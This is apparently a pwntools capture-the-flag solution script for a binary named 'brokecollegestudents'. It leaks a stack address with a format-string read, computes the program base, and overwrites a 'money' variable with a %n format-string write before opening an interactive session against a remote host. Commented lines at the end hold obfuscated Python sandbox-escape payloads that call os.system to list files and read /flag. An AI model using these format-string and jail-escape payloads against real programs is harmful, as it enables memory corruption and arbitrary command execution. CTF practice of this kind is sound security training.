#!/usr/bin/python3
import pwn
path = './brokecollegestudents'
elf = pwn.context.binary = pwn.ELF(path)
if pwn.args.GDB:
    io = pwn.gdb.debug(path, gdbscript="")
else:
    if pwn.args.REMOTE:
        io = pwn.remote("143.198.184.186", 5001)
    else:
        io = elf.process()
print(io.recv(4096).decode())
io.sendline(b"1")
print(io.recv(4096).decode())
io.sendline(b"1")
print(io.recv(4096).decode())
io.sendline(b"1")
print(io.recv(4096).decode())
io.sendline(b'%8$p.')
print(io.recvuntil(b"was: \n\n"))
leak = io.recvuntil(b".", drop=True)
leak = int(leak, 16)
print(hex(leak))
elf.address = leak - 4448
money_addr = elf.address + 16412
print(hex(elf.address))
print(hex(money_addr))
print(io.recv(4096).decode())
io.sendline(b"1")
print(io.recv(4096).decode())
io.sendline(b"1")
print(io.recv(4096).decode())
io.sendline(b"1")
print(io.recv(4096).decode())
SIZE = 24
money_addr += 3
payload = b"%100x%8$n."
payload += b"B"*6
payload += pwn.p64(money_addr)
io.sendline(payload)
io.interactive()
# print(getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('ls .'))

# __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /flag')

# getattr(getattr(globals()['__bui'+'ltins__'],'__im'+'port__')('o'+'s'),'sy'+'stem')('cat'+'\x20cf*')
1317624576693539428
9223372036854775807
2147483647

1317624576693539401
